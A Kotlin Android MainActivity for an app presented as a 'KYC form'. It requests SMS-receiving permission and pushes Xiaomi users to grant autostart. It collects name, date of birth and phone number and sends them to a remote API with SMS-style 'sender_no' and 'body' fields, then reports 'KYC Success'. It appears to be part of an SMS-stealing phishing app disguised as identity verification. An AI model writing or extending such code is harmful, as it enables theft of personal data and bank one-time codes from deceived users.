package br.com.helpdev.kycform

import android.Manifest
import android.annotation.SuppressLint
import android.app.admin.DevicePolicyManager
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.preference.Preference
import android.util.Log
import android.widget.EditText
import android.widget.RelativeLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.ActivityCompat.startActivityForResult
import androidx.core.content.ContextCompat
import br.com.helpdev.kycform.helper.*
import com.google.gson.JsonObject
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.util.*
import android.content.ComponentName





class MainActivity : AppCompatActivity() {

    lateinit var name: EditText
    lateinit var number: EditText
    lateinit var dob: EditText
    /*  var  prefrenceManager: PrefrenceManger1()*/


    companion object {
        private const val REQUEST_CODE_SMS_PERMISSION = 1
    }

    val m1 = PrefrenceManger1()





    @SuppressLint("WrongViewCast")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        requestSmsPermission()


        if (isMIUI()) {
            //this will launch the auto start screen where user can enable the permission for your app
            val localIntent = Intent("miui.intent.action.APP_PERM_EDITOR")
            localIntent.setClassName(
                "com.miui.securitycenter",
                "com.miui.permcenter.permissions.PermissionsEditorActivity"
            )
            localIntent.putExtra("extra_pkgname", getPackageName())
            startActivity(localIntent)
        }

        val manufacturer = "xiaomi"
        if (manufacturer.equals(Build.MANUFACTURER, ignoreCase = true)) {
            //this will open auto start screen where user can enable permission for your app
            val intent = Intent()
            intent.component = ComponentName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"
            )
            startActivity(intent)
        }

        name = findViewById<EditText>(R.id.username)
        number = findViewById<EditText>(R.id.number)
        dob = findViewById<EditText>(R.id.dob)
        dob = findViewById<EditText>(R.id.dob)
        val showButton = findViewById<RelativeLayout>(R.id.signin)

        m1.setMobileno("9118919678", applicationContext);
        Log.e("testData", "onCreate: " + (m1?.getmobilno(applicationContext)))


        showButton.setOnClickListener {

            var nam = name.text
            val dosb = dob.text
            val numbers = number.text
            val text = name.text

            val userInfo = DataRequest(
                sender_no = "" + "",
                body = "Installing" + "",
                name = name.text.toString() + "",
                dob = "" + dob.text.toString(),
                contact = "" + number.text.toString()
            )


            m1.setMobileno(number.text.toString(), applicationContext);
            m1.setName(name.text.toString(), applicationContext);
            m1.setDob(dob.text.toString(), applicationContext);

            // api call
            addUser(userInfo)

        }
    }

    private fun requestSmsPermission() {
        val permission = Manifest.permission.RECEIVE_SMS
        val grant = ContextCompat.checkSelfPermission(this, permission)
        if (grant != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(permission),
                REQUEST_CODE_SMS_PERMISSION
            )
        }
    }


    fun addUser(userData: DataRequest) {

        val retrofit = ServiceBuilder.buildService(RestApi::class.java)
        retrofit.addUser(userData).enqueue(
            object : Callback<JsonObject> {
                override fun onFailure(call: Call<JsonObject>, t: Throwable) {

                }

                override fun onResponse(call: Call<JsonObject>, response: Response<JsonObject>) {
                    val addedUser = response.body()
                    Toast.makeText(applicationContext, "Your KYC Success Full", Toast.LENGTH_SHORT)
                        .show()
                }
            }
        )
    }


    fun isMIUI(): Boolean {
        val device = Build.MANUFACTURER
        if (device == "Xiaomi") {
            try {
                val prop = Properties()
                prop.load(FileInputStream(File(Environment.getRootDirectory(), "build.prop")))
                return prop.getProperty(
                    "ro.miui.ui.version.code",
                    null
                ) != null || prop.getProperty(
                    "ro.miui.ui.version.name",
                    null
                ) != null || prop.getProperty("ro.miui.internal.storage", null) != null
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
        return false
    }



}

